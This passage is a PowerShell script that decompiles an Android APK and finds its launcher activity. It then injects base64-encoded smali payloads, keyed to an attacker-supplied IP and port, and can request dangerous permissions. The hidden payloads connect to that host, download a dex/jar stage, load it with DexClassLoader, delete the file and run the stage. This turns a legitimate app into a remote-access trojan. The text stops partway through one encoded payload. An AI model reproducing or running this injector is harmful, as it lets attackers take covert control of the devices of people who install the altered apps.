[CmdletBinding(DefaultParametersetName='__Apk')]
Param (
	[Parameter(Mandatory = $True, Position = 0, ParameterSetName='__Apk')]
	[ValidateScript({ [IO.File]::Exists((Resolve-Path $_).Path) })]
	[String] $Apk,
	
	[Parameter(Mandatory = $True, Position = 0, ParameterSetName='__DecompiledApk')]
	[ValidateScript({ [IO.Directory]::Exists((Resolve-Path $_).Path) })]
	[String] $DecompiledApk,
	
	[Parameter(Mandatory = $True, Position = 1)]
	[ValidateScript({ $null -ne ([IPAddress]$_) })]
	[String] $IP,
	
	[Parameter(Mandatory = $True, Position = 2)]
	[ValidateRange(1, 65536)] # [Math]::Pow(16, 4)
	[Int] $Port,
	
	[Parameter(Mandatory = $False, Position = 3)]
	[ValidateSet('Default', 'Recommended', 'Dangerous', 'All')]
	[String] $Permissions = 'Default',
	
	[Parameter(Mandatory = $False, Position = 4)]
	[Switch] $Force
)

#region Helper functions

Function Invoke-Apktool {
	Param (
		[Parameter(Mandatory = $True, Position = 0)]
		[String] $Arguments
	)
	
	$ProcessInfo = New-Object Diagnostics.ProcessStartInfo
	$ProcessInfo.FileName = (Get-Command apktool).Source
	$ProcessInfo.Arguments = $Arguments
	$ProcessInfo.RedirectStandardError = $ProcessInfo.RedirectStandardOutput = $True
	$ProcessInfo.UseShellExecute = $False
	
#	$Errors = ''
	$Process = [Diagnostics.Process]::Start($ProcessInfo)
	#Write-Host '+-------------------------------------------------------------------------------+'
	Do {
		Write-Result $Process.StandardOutput.ReadLine().Replace('I:', '[*]')
#		$Process.StandardError.ReadLine() | % {
#			$Errors += $_
#			Write-Result $_.Replace('W: warning:', '[!]') Warning
#		}
	} Until ($Process.StandardOutput.EndOfStream)
	
	return $Process.StandardError.ReadToEnd()
}

Function Decompile-Apk {
	Param (
		[Parameter(Mandatory = $True, Position = 0)]
		[IO.FileInfo] $Apk,
		
		[Parameter(Mandatory = $False, Position = 1)]
		[Switch] $Force
	)
	
	Write-Command decompile
	$OutputPath = Join-Path $PWD $Apk.BaseName
	$Command = 'd ' + $Apk.FullName + " -o $OutputPath"
	if ($Force) {
		$Command += ' -f'
	}
	
	$Result = Invoke-Apktool $Command
	if ($Result -match 'error|Exception') {
		Write-Result '[!] There was an error decompiling the Apk' Error
		Write-Result $Result Warning
		return
	} else {
		return $OutputPath
	}
}

Function Get-TargetActivity {
	Param (
		[Parameter(Mandatory = $True, Position = 0)]
		[ValidateScript({ [IO.Directory]::Exists((Resolve-Path $_).Path) })]
		[String] $DecompiledApk
	)
	
	BEGIN
	{
		#Write-Host '[*] Searching target activity...'
		Write-Command "find target_activity"
		
		$ManifestPath = Join-Path $DecompiledApk 'AndroidManifest.xml'
		$Manifest = [Xml](Get-Content $ManifestPath)
	}
	
	PROCESS
	{
		foreach ($Activity in $Manifest.manifest.application.activity + $Manifest.manifest.application.'activity-alias') {
			try {
				if ($Activity.InnerXml.Contains('LAUNCHER')) {
					if ($Activity.targetactivity) {
						$TargetActivity = $Activity.targetactivity
					} elseif ($Activity.name) {
						$TargetActivity = $Activity.name
					}
				}
			} catch {}
		}
		if ($TargetActivity) {
			#Write-Host "[+] Target activity: $TargetActivity"
			Write-Result "[+] Target activity: $TargetActivity"
			return $TargetActivity
		} else {
			Write-Result "[!] Couldn't find target activity" Error
			#Write-Host "[!] Couldn't find target activity"
			break
		}
	}
}

Function Write-Payloads {
	Param (
		[Parameter(Mandatory = $True, Position = 0)]
		[ValidateScript({ [IO.Directory]::Exists((Resolve-Path $_).Path) })]
		[String] $DecompiledApk,
		
		[Parameter(Mandatory = $True, Position = 1)]
		[String] $TargetActivity,
		
		[Parameter(Mandatory = $True, Position = 2)]
        [String] $HexHost,
        
        [Parameter(Mandatory = $True, Position = 3)]
        [String] $HexHostLength
	)
	
	BEGIN
	{
		$Payload1 = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('LmNsYXNzIGZpbmFsIFBMQUNFSE9MREVSL0Fzc2lzdEFjdGl2aXR5MTsKLnN1cGVyIExqYXZhL2xhbmcvVGhyZWFkOwouc291cmNlICJBc3Npc3RBY3Rpdml0eS5qYXZhIgoKCiMgYW5ub3RhdGlvbnMKLmFubm90YXRpb24gc3lzdGVtIExkYWx2aWsvYW5ub3RhdGlvbi9FbmNsb3NpbmdNZXRob2Q7CiAgICB2YWx1ZSA9IFBMQUNFSE9MREVSL0Fzc2lzdEFjdGl2aXR5Oy0+c3RhcnRBc3luYygpVgouZW5kIGFubm90YXRpb24KCi5hbm5vdGF0aW9uIHN5c3RlbSBMZGFsdmlrL2Fubm90YXRpb24vSW5uZXJDbGFzczsKICAgIGFjY2Vzc0ZsYWdzID0gMHg4CiAgICBuYW1lID0gbnVsbAouZW5kIGFubm90YXRpb24KCgojIGRpcmVjdCBtZXRob2RzCi5tZXRob2QgY29uc3RydWN0b3IgPGluaXQ+KClWCiAgICAubG9jYWxzIDAKCiAgICAucHJvbG9ndWUKICAgIC5saW5lIDM0CiAgICBpbnZva2UtZGlyZWN0IHtwMH0sIExqYXZhL2xhbmcvVGhyZWFkOy0+PGluaXQ+KClWCgogICAgcmV0dXJuLXZvaWQKLmVuZCBtZXRob2QKCgojIHZpcnR1YWwgbWV0aG9kcwoubWV0aG9kIHB1YmxpYyBydW4oKVYKICAgIC5sb2NhbHMgMgoKICAgIC5wcm9sb2d1ZQogICAgLmxpbmUgMzcKICAgIGNvbnN0LzQgdjEsIDB4MAoKICAgIDp0cnlfc3RhcnRfMAogICAgaW52b2tlLXN0YXRpYyB7djF9LCBQTEFDRUhPTERFUi9Bc3Npc3RBY3Rpdml0eTstPm1haW4oW0xqYXZhL2xhbmcvU3RyaW5nOylWCiAgICA6dHJ5X2VuZF8wCiAgICAuY2F0Y2ggTGphdmEvbGFuZy9FeGNlcHRpb247IHs6dHJ5X3N0YXJ0XzAgLi4gOnRyeV9lbmRfMH0gOmNhdGNoXzAKCiAgICAubGluZSA0MQogICAgOmdvdG9fMAogICAgcmV0dXJuLXZvaWQKCiAgICAubGluZSAzOAogICAgOmNhdGNoXzAKICAgIG1vdmUtZXhjZXB0aW9uIHYwCgogICAgLmxpbmUgMzkKICAgIC5sb2NhbCB2MCwgImUiOkxqYXZhL2xhbmcvRXhjZXB0aW9uOwogICAgaW52b2tlLXZpcnR1YWwge3YwfSwgTGphdmEvbGFuZy9FeGNlcHRpb247LT5wcmludFN0YWNrVHJhY2UoKVYKCiAgICBnb3RvIDpnb3RvXzAKLmVuZCBtZXRob2QK'))
		$Payload2 = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('LmNsYXNzIHB1YmxpYyBQTEFDRUhPTERFUi9Bc3Npc3RBY3Rpdml0eTsKLnN1cGVyIExqYXZhL2xhbmcvT2JqZWN0Owouc291cmNlICJBc3Npc3RBY3Rpdml0eS5qYXZhIgoKCiMgc3RhdGljIGZpZWxkcwouZmllbGQgcHVibGljIHN0YXRpYyBmaW5hbCBhcnJheTpbQgoKLmZpZWxkIHByaXZhdGUgc3RhdGljIHBhcmFtZXRlcnM6W0xqYXZhL2xhbmcvU3RyaW5nOwoKLmZpZWxkIHB1YmxpYyBzdGF0aWMgcmV0cnlfdG90YWw6SgoKLmZpZWxkIHB1YmxpYyBzdGF0aWMgcmV0cnlfd2FpdDpKCgouZmllbGQgcHVibGljIHN0YXRpYyBmaW5hbCB0QXJyOltCCgouZmllbGQgcHVibGljIHN0YXRpYyB0aW1lb3V0T2ZUaGVDb25uOkoKCi5maWVsZCBwdWJsaWMgc3RhdGljIHdoZW5UaGVTZXNzaW9uRXhwaXJlczpKCgoKIyBkaXJlY3QgbWV0aG9kcwoubWV0aG9kIHN0YXRpYyBjb25zdHJ1Y3RvciA8Y2xpbml0PigpVgogICAgLmxvY2FscyAxCgogICAgLnByb2xvZ3VlCiAgICAubGluZSAxOQogICAgY29uc3QvMTYgdjAsIEhFWExFTkdUSAoKICAgIG5ldy1hcnJheSB2MCwgdjAsIFtCCgogICAgZmlsbC1hcnJheS1kYXRhIHYwLCA6YXJyYXlfMAoKICAgIHNwdXQtb2JqZWN0IHYwLCBQTEFDRUhPTERFUi9Bc3Npc3RBY3Rpdml0eTstPmFycmF5OltCCgogICAgLmxpbmUgMjEKICAgIGNvbnN0LzE2IHYwLCAweDE2CgogICAgbmV3LWFycmF5IHYwLCB2MCwgW0IKCiAgICBmaWxsLWFycmF5LWRhdGEgdjAsIDphcnJheV8xCgogICAgc3B1dC1vYmplY3QgdjAsIFBMQUNFSE9MREVSL0Fzc2lzdEFjdGl2aXR5Oy0+dEFycjpbQgoKICAgIHJldHVybi12b2lkCgogICAgLmxpbmUgMTkKICAgIG5vcAoKICAgIDphcnJheV8wCiAgICAuYXJyYXktZGF0YSAxCiAgICAgICAgU1JWSE9TVAogICAgLmVuZCBhcnJheS1kYXRhCgogICAgLmxpbmUgMjEKICAgIG5vcAoKICAgIDphcnJheV8xCiAgICAuYXJyYXktZGF0YSAxCiAgICAgICAgMHg1NHQKICAgICAgICAweDU0dAogICAgICAgIDB4NTR0CiAgICAgICAgMHg1NHQKICAgICAgICAweDM2dAogICAgICAgIDB4MzB0CiAgICAgICAgMHgzNHQKICAgICAgICAweDM4dAogICAgICAgIDB4MzB0CiAgICAgICAgMHgzMHQKICAgICAgICAweDJkdAogICAgICAgIDB4MzN0CiAgICAgICAgMHgzMHQKICAgICAgICAweDMwdAogICAgICAgIDB4MmR0CiAgICAgICAgMHgzM3QKICAgICAgICAweDM2dAogICAgICAgIDB4MzB0CiAgICAgICAgMHgzMHQKICAgICAgICAweDJkdAogICAgICAgIDB4MzF0CiAgICAgICAgMHgzMHQKICAgIC5lbmQgYXJyYXktZGF0YQouZW5kIG1ldGhvZAoKLm1ldGhvZCBwdWJsaWMgY29uc3RydWN0b3IgPGluaXQ+KClWCiAgICAubG9jYWxzIDAKCiAgICAucHJvbG9ndWUKICAgIC5saW5lIDE3CiAgICBpbnZva2UtZGlyZWN0IHtwMH0sIExqYXZhL2xhbmcvT2JqZWN0Oy0+PGluaXQ+KClWCgogICAgcmV0dXJuLXZvaWQKLmVuZCBtZXRob2QKCi5tZXRob2QgcHVibGljIHN0YXRpYyBkb1RoaXMoTGFuZHJvaWQvY29udGVudC9Db250ZXh0OylWCiAgICAubG9jYWxzIDEKICAgIC5wYXJhbSBwMCwgImNvbnRleHQiICAgICMgTGFuZHJvaWQvY29udGVudC9Db250ZXh0OwoKICAgIC5wcm9sb2d1ZQogICAgLmxpbmUgMzAKICAgIGludm9rZS12aXJ0dWFsIHtwMH0sIExhbmRyb2lkL2NvbnRlbnQvQ29udGV4dDstPmdldEZpbGVzRGlyKClMamF2YS9pby9GaWxlOwoKICAgIG1vdmUtcmVzdWx0LW9iamVjdCB2MAoKICAgIGludm9rZS12aXJ0dWFsIHt2MH0sIExqYXZhL2lvL0ZpbGU7LT50b1N0cmluZygpTGphdmEvbGFuZy9TdHJpbmc7CgogICAgbW92ZS1yZXN1bHQtb2JqZWN0IHYwCgogICAgaW52b2tlLXN0YXRpYyB7djB9LFBMQUNFSE9MREVSL0Fzc2lzdEFjdGl2aXR5Oy0+cGF0aFRvU3RhcnRJbihMamF2YS9sYW5nL1N0cmluZzspVgoKICAgIC5saW5lIDMxCiAgICByZXR1cm4tdm9pZAouZW5kIG1ldGhvZAoKLm1ldGhvZCBwcml2YXRlIHN0YXRpYyBsZWVzRW5Mb29wRGllRGluZyhMamF2YS9pby9EYXRhSW5wdXRTdHJlYW07TGphdmEvaW8vT3V0cHV0U3RyZWFtO1tMamF2YS9sYW5nL1N0cmluZzspVgogICAgLmxvY2FscyAxNQogICAgLnBhcmFtIHAwLCAiaW4iICAgICMgTGphdmEvaW8vRGF0YUlucHV0U3RyZWFtOwogICAgLnBhcmFtIHAxLCAib3V0IiAgICAjIExqYXZhL2lvL091dHB1dFN0cmVhbTsKICAgIC5wYXJhbSBwMiwgInBhcmFtZXRlcnMiICAgICMgW0xqYXZhL2xhbmcvU3RyaW5nOwogICAgLmFubm90YXRpb24gc3lzdGVtIExkYWx2aWsvYW5ub3RhdGlvbi9UaHJvd3M7CiAgICAgICAgdmFsdWUgPSB7CiAgICAgICAgICAgIExqYXZhL2xhbmcvRXhjZXB0aW9uOwogICAgICAgIH0KICAgIC5lbmQgYW5ub3RhdGlvbgoKICAgIC5wcm9sb2d1ZQogICAgLmxpbmUgMTA5CiAgICBjb25zdC80IHYxMSwgMHgwCgogICAgYWdldC1vYmplY3QgdjcsIHAyLCB2MTEKCiAgICAubGluZSAxMTAKICAgIC5sb2NhbCB2NywgInBhdGgiOkxqYXZhL2xhbmcvU3RyaW5nOwogICAgY29uc3QvMTYgdjExLCAweDgKCiAgICBuZXctYXJyYXkgdjAsIHYxMSwgW0IKCiAgICBmaWxsLWFycmF5LWRhdGEgdjAsIDphcnJheV8wCgogICAgLmxpbmUgMTExCiAgICAubG9jYWwgdjAsICJhcnIxIjpbQgogICAgY29uc3QvMTYgdjExLCAweDgKCiAgICBuZXctYXJyYXkgdjEsIHYxMSwgW0IKCiAgICBmaWxsLWFycmF5LWRhdGEgdjEsIDphcnJheV8xCgogICAgLmxpbmUgMTE0CiAgICAubG9jYWwgdjEsICJhcnIyIjpbQgogICAgbmV3LWluc3RhbmNlIHYxMSwgTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwoKICAgIGludm9rZS1kaXJlY3Qge3YxMX0sIExqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjstPjxpbml0PigpVgoKICAgIGludm9rZS12aXJ0dWFsIHt2MTEsIHY3fSwgTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOy0+YXBwZW5kKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7CgogICAgbW92ZS1yZXN1bHQtb2JqZWN0IHYxMQoKICAgIHNnZXQtY2hhciB2MTIsIExqYXZhL2lvL0ZpbGU7LT5zZXBhcmF0b3JDaGFyOkMKCiAgICBpbnZva2UtdmlydHVhbCB7djExLCB2MTJ9LCBMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7LT5hcHBlbmQoQylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7CgogICAgbW92ZS1yZXN1bHQtb2JqZWN0IHYxMQoKICAgIG5ldy1pbnN0YW5jZSB2MTIsIExqYXZhL2xhbmcvU3RyaW5nOwoKICAgIGludm9rZS1kaXJlY3Qge3YxMiwgdjB9LCBMamF2YS9sYW5nL1N0cmluZzstPjxpbml0PihbQilWCgogICAgaW52b2tlLXZpcnR1YWwge3YxMSwgdjEyfSwgTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOy0+YXBwZW5kKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7CgogICAgbW92ZS1yZXN1bHQtb2JqZWN0IHYxMQoKICAgIGludm9rZS12aXJ0dWFsIHt2MTF9LCBMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7LT50b1N0cmluZygpTGphdmEvbGFuZy9TdHJpbmc7CgogICAgbW92ZS1yZXN1bHQtb2JqZWN0IHY5CgogICAgLmxpbmUgMTE1CiAgICAubG9jYWwgdjksICJwYXRoVG9UaGVGaWxlIjpMamF2YS9sYW5nL1N0cmluZzsKICAgIG5ldy1pbnN0YW5jZSB2MTEsIExqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsKCiAgICBpbnZva2UtZGlyZWN0IHt2MTF9LCBMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7LT48aW5pdD4oKVYKCiAgICBpbnZva2UtdmlydHVhbCB7djExLCB2N30sIExqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjstPmFwcGVuZChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwoKICAgIG1vdmUtcmVzdWx0LW9iamVjdCB2MTEKCiAgICBzZ2V0LWNoYXIgdjEyLCBMamF2YS9pby9GaWxlOy0+c2VwYXJhdG9yQ2hhcjpDCgogICAgaW52b2tlLXZpcnR1YWwge3YxMSwgdjEyfSwgTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOy0+YXBwZW5kKEMpTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwoKICAgIG1vdmUtcmVzdWx0LW9iamVjdCB2MTEKCiAgICBuZXctaW5zdGFuY2UgdjEyLCBMamF2YS9sYW5nL1N0cmluZzsKCiAgICBpbnZva2UtZGlyZWN0IHt2MTIsIHYxfSwgTGphdmEvbGFuZy9TdHJpbmc7LT48aW5pdD4oW0IpVgoKICAgIGludm9rZS12aXJ0dWFsIHt2MTEsIHYxMn0sIExqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjstPmFwcGVuZChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwoKICAgIG1vdmUtcmVzdWx0LW9iamVjdCB2MTEKCiAgICBpbnZva2UtdmlydHVhbCB7djExfSwgTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOy0+dG9TdHJpbmcoKUxqYXZhL2xhbmcvU3RyaW5nOwoKICAgIG1vdmUtcmVzdWx0LW9iamVjdCB2OAoKICAgIC5saW5lIDExNwogICAgLmxvY2FsIHY4LCAicGF0aFRvVGhlRGV4IjpMamF2YS9sYW5nL1N0cmluZzsKICAgIGludm9rZS12aXJ0dWFsIHtwMH0sIExqYXZhL2lvL0RhdGFJbnB1dFN0cmVhbTstPnJlYWRJbnQoKUkKCiAgICBtb3ZlLXJlc3VsdCB2MTEKCiAgICBuZXctYXJyYXkgdjMsIHYxMSwgW0IKCiAgICAubGluZSAxMTgKICAgIC5sb2NhbCB2MywgImNvcmUiOltCCiAgICBpbnZva2UtdmlydHVhbCB7cDAsIHYzfSwgTGphdmEvaW8vRGF0YUlucHV0U3RyZWFtOy0+cmVhZEZ1bGx5KFtCKVYKCiAgICAubGluZSAxMTkKICAgIG5ldy1pbnN0YW5jZSB2MiwgTGphdmEvbGFuZy9TdHJpbmc7CgogICAgaW52b2tlLWRpcmVjdCB7djIsIHYzfSwgTGphdmEvbGFuZy9TdHJpbmc7LT48aW5pdD4oW0IpVgoKICAgIC5saW5lIDEyMAogICAgLmxvY2FsIHYyLCAiY2xhc3NGaWxlIjpMamF2YS9sYW5nL1N0cmluZzsKICAgIGludm9rZS12aXJ0dWFsIHtwMH0sIExqYXZhL2lvL0RhdGFJbnB1dFN0cmVhbTstPnJlYWRJbnQoKUkKCiAgICBtb3ZlLXJlc3VsdCB2MTEKCiAgICBuZXctYXJyYXkgdjMsIHYxMSwgW0IKCiAgICAubGluZSAxMjEKICAgIGludm9rZS12aXJ0dWFsIHtwMCwgdjN9LCBMamF2YS9pby9EYXRhSW5wdXRTdHJlYW07LT5yZWFkRnVsbHkoW0IpVgoKICAgIC5saW5lIDEyMgogICAgbmV3LWluc3RhbmNlIHY0LCBMamF2YS9pby9GaWxlOwoKICAgIGludm9rZS1kaXJlY3Qge3Y0LCB2OX0sIExqYXZhL2lvL0ZpbGU7LT48aW5pdD4oTGphdmEvbGFuZy9TdHJpbmc7KVYKCiAgICAubGluZSAxMjMKICAgIC5sb2NhbCB2NCwgImZpbGUiOkxqYXZhL2lvL0ZpbGU7CiAgICBpbnZva2UtdmlydHVhbCB7djR9LCBMamF2YS9pby9GaWxlOy0+ZXhpc3RzKClaCgogICAgbW92ZS1yZXN1bHQgdjExCgogICAgaWYtbmV6IHYxMSwgOmNvbmRfMAoKICAgIC5saW5lIDEyNAogICAgaW52b2tlLXZpcnR1YWwge3Y0fSwgTGphdmEvaW8vRmlsZTstPmNyZWF0ZU5ld0ZpbGUoKVoKCiAgICAubGluZSAxMjYKICAgIDpjb25kXzAKICAgIG5ldy1pbnN0YW5jZSB2NSwgTGphdmEvaW8vRmlsZU91dHB1dFN0cmVhbTsKCiAgICBpbnZva2UtZGlyZWN0IHt2NSwgdjR9LCBMamF2YS9pby9GaWxlT3V0cHV0U3RyZWFtOy0+PGluaXQ+KExqYXZhL2lvL0ZpbGU7KVYKCiAgICAubGluZSAxMjcKICAgIC5sb2NhbCB2NSwgImZvcCI6TGphdmEvaW8vRmlsZU91dHB1dFN0cmVhbTsKICAgIGludm9rZS12aXJ0dWFsIHt2NSwgdjN9LCBMamF2YS9pby9GaWxlT3V0cHV0U3RyZWFtOy0+d3JpdGUoW0IpVgoKICAgIC5saW5lIDEyOAogICAgaW52b2tlLXZpcnR1YWwge3Y1fSwgTGphdmEvaW8vRmlsZU91dHB1dFN0cmVhbTstPmZsdXNoKClWCgogICAgLmxpbmUgMTI5CiAgICBpbnZva2UtdmlydHVhbCB7djV9LCBMamF2YS9pby9GaWxlT3V0cHV0U3RyZWFtOy0+Y2xvc2UoKVYKCiAgICAubGluZSAxMzAKICAgIG5ldy1pbnN0YW5jZSB2MTEsIExkYWx2aWsvc3lzdGVtL0RleENsYXNzTG9hZGVyOwoKICAgIGNvbnN0LWNsYXNzIHYxMiwgUExBQ0VIT0xERVIvQXNzaXN0QWN0aXZpdHk7CgogICAgaW52b2tlLXZpcnR1YWwge3YxMn0sIExqYXZhL2xhbmcvQ2xhc3M7LT5nZXRDbGFzc0xvYWRlcigpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsKCiAgICBtb3ZlLXJlc3VsdC1vYmplY3QgdjEyCgogICAgaW52b2tlLWRpcmVjdCB7djExLCB2OSwgdjcsIHY3LCB2MTJ9LCBMZGFsdmlrL3N5c3RlbS9EZXhDbGFzc0xvYWRlcjstPjxpbml0PihMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWCgogICAgaW52b2tlLXZpcnR1YWwge3YxMSwgdjJ9LCBMZGFsdmlrL3N5c3RlbS9EZXhDbGFzc0xvYWRlcjstPmxvYWRDbGFzcyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsKCiAgICBtb3ZlLXJlc3VsdC1vYmplY3QgdjYKCiAgICAubGluZSAxMzEKICAgIC5sb2NhbCB2NiwgIm15Q2xhc3MiOkxqYXZhL2xhbmcvQ2xhc3M7LCAiTGphdmEvbGFuZy9DbGFzczwqPjsiCiAgICBpbnZva2UtdmlydHVhbCB7djZ9LCBMamF2YS9sYW5nL0NsYXNzOy0+bmV3SW5zdGFuY2UoKUxqYXZhL2xhbmcvT2JqZWN0OwoKICAgIG1vdmUtcmVzdWx0LW9iamVjdCB2MTAKCiAgICAubGluZSAxMzIKICAgIC5sb2NhbCB2MTAsICJzdGFnZSI6TGphdmEvbGFuZy9PYmplY3Q7CiAgICBpbnZva2UtdmlydHVhbCB7djR9LCBMamF2YS9pby9GaWxlOy0+ZGVsZXRlKClaCgogICAgLmxpbmUgMTMzCiAgICBuZXctaW5zdGFuY2UgdjExLCBMamF2YS9pby9GaWxlOwoKICAgIGludm9rZS1kaXJlY3Qge3YxMSwgdjh9LCBMamF2YS9pby9GaWxlOy0+PGluaXQ+KExqYXZhL2xhbmcvU3RyaW5nOylWCgogICAgaW52b2tlLXZpcnR1YWwge3YxMX0sIExqYXZhL2lvL0ZpbGU7LT5kZWxldGUoKVoKCiAgICAubGluZSAxMzQKICAgIGNvbnN0LXN0cmluZyB2MTEsICJzdGFydCIKCiAgICBjb25zdC80IHYxMiwgMHgzCgogICAgbmV3LWFycmF5IHYxMiwgdjEyLCBbTGphdmEvbGFuZy9DbGFzczsKCiAgICBjb25zdC80IHYxMywgMHgwCgogICAgY29uc3QtY2xhc3MgdjE0LCBMamF2YS9pby9EYXRhSW5wdXRTdHJlYW07CgogICAgYXB1dC1vYmplY3QgdjE0LCB2MTIsIHYxMwoKICAgIGNvbnN0LzQgdjEzLCAweDEKCiAgICBjb25zdC1jbGFzcyB2MTQsIExqYXZhL2lvL091dHB1dFN0cmVhbTsKCiAgICBhcHV0LW9iamVjdCB2MTQsIHYxMiwgdjEzCgogICAgY29uc3QvNCB2MTMsIDB4MgoKICAgIGNvbnN0LWNsYXNzIHYxNCwgW0xqYXZhL2xhbmcvU3RyaW5nOwoKICAgIGFwdXQtb2JqZWN0IHYxNCwgdjEyLCB2MTMKCiAgICBpbnZva2UtdmlydHVhbCB7djYsIHYxMSwgdjEyfSwgTGphdmEvbGFuZy9DbGFzczstPmdldE1ldGhvZChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsKCiAgICBtb3ZlLXJlc3VsdC1vYmplY3QgdjExCgogICAgY29uc3QvNCB2MTIsIDB4MwoKICAgIG5ldy1hcnJheSB2MTIsIHYxMiwgW0xqYXZhL2xhbmcvT2JqZWN0OwoKICAgIGNvbnN0LzQgdjEzLCAweDAKCiAgICBhcHV0LW9iamVjdCBwMCwgdjEyLCB2MTMKCiAgICBjb25zdC80IHYxMywgMHgxCgogICAgYXB1dC1vYmplY3QgcDEsIHYxMiwgdjEzCgogICAgY29uc3QvNCB2MTMsIDB4MgoKICAgIGFwdXQtb2JqZWN0IHAyLCB2MTIsIHYxMwoKICAgIGludm9rZS12aXJ0dWFsIHt2MTEsIHYxMCwgdjEyfSwgTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDstPmludm9rZShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwoKICAgIC5saW5lIDEzNQogICAgY29uc3QvNCB2MTEsIDB4MAoKICAgIGludm9rZS1zdGF0aWMge3YxMX0sIExqYXZhL2xhbmcvU3lzdGVtOy0+ZXhpdChJKVYKCiAgICAubGluZSAxMzYKICAgIHJldHVybi12b2lkCgogICAgLmxpbmUgMTEwCiAgICA6YXJyYXlfMAogICAgLmFycmF5LWRhdGEgMQogICAgICAgIDB4NzN0CiAgICAgICAgMHg2YnQKICAgICAgICAweDYxdAogICAgICAgIDB4NzR0CiAgICAgICAgMHgyZXQKICAgICAgICAweDZhdAogICAgICAgIDB4NjF0CiAgICAgICAgMHg3MnQKICAgIC5lbmQgYXJyYXktZGF0YQoKICAgIC5saW5lIDExMQogICAgOmFycmF5XzEKICAgIC5hcnJheS1kYXRhIDEKICAgICAgICAweDczdAogICAgICAgIDB4NmJ0CiAgICAgICAgMHg2MXQKICAgICAgICAweDc0dAogICAgICAgIDB4MmV0CiAgICAgICAgMHg2NHQKICAgICAgICAweDY1dAogICAgICAgIDB4Nzh0CiAgICAuZW5kIGFycmF5LWRhdGEKLmVuZCBtZXRob2QKCi5tZXRob2QgcHJpdmF0ZSBzdGF0aWMgbWFha0RpZVN0YWdlVmFuVGNwKExqYXZhL2xhbmcvU3RyaW5nOylWCiAgICAubG9jYWxzIDgKICAgIC5wYXJhbSBwMCwgInVybCIgICAgIyBMamF2YS9sYW5nL1N0cmluZzsKICAgIC5hbm5vdGF0aW9uIHN5c3RlbSBMZGFsdmlrL2Fubm90YXRpb24vVGhyb3dzOwogICAgICAgIHZhbHVlID0gewogICAgICAgICAgICBMamF2YS9sYW5nL0V4Y2VwdGlvbjsKICAgICAgICB9CiAgICAuZW5kIGFubm90YXRpb24KCiAgICAucHJvbG9ndWUKICAgIGNvbnN0LzQgdjcsIDB4MgoKICAgIC5saW5lIDkyCiAgICBjb25zdC1zdHJpbmcgdjUsICI6IgoKICAgIGludm9rZS12aXJ0dWFsIHtwMCwgdjV9LCBMamF2YS9sYW5nL1N0cmluZzstPnNwbGl0KExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7CgogICAgbW92ZS1yZXN1bHQtb2JqZWN0IHYwCgogICAgLmxpbmUgOTMKICAgIC5sb2NhbCB2MCwgImRpbmdlIjpbTGphdmEvbGFuZy9TdHJpbmc7CiAgICBhZ2V0LW9iamVjdCB2NSwgdjAsIHY3CgogICAgaW52b2tlLXN0YXRpYyB7djV9LCBMamF2YS9sYW5nL0ludGVnZXI7LT5wYXJzZUludChMamF2YS9sYW5nL1N0cmluZzspSQoKICAgIG1vdmUtcmVzdWx0IHYyCgogICAgLmxpbmUgOTQKICAgIC5sb2NhbCB2MiwgInBvcnQiOkkKICAgIGNvbnN0LzQgdjUsIDB4MQoKICAgIGFnZXQtb2JqZWN0IHY1LCB2MCwgdjUKCiAgICBjb25zdC1zdHJpbmcgdjYsICIvIgoKICAgIGludm9rZS12aXJ0dWFsIHt2NSwgdjZ9LCBMamF2YS9sYW5nL1N0cmluZzstPnNwbGl0KExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7CgogICAgbW92ZS1yZXN1bHQtb2JqZWN0IHY1CgogICAgYWdldC1vYmplY3QgdjEsIHY1LCB2NwoKICAgIC5saW5lIDk1CiAgICAubG9jYWwgdjEsICJob3N0IjpMamF2YS9sYW5nL1N0cmluZzsKICAgIGNvbnN0LXN0cmluZyB2NSwgIiIKCiAgICBpbnZva2UtdmlydHVhbCB7djEsIHY1fSwgTGphdmEvbGFuZy9TdHJpbmc7LT5lcXVhbHMoTGphdmEvbGFuZy9PYmplY3Q7KVoKCiAgICBtb3ZlLXJlc3VsdCB2NQoKICAgIGlmLWVxeiB2NSwgOmNvbmRfMQoKICAgIC5saW5lIDk2CiAgICBuZXctaW5zdGFuY2UgdjMsIExqYXZhL25ldC9TZXJ2ZXJTb2NrZXQ7CgogICAgaW52b2tlLWRpcmVjdCB7djMsIHYyfSwgTGphdmEvbmV0L1NlcnZlclNvY2tldDstPjxpbml0PihJKVYKCiAgICAubGluZSA5NwogICAgLmxvY2FsIHYzLCAic2VydmVyIjpMamF2YS9uZXQvU2VydmVyU29ja2V0Ow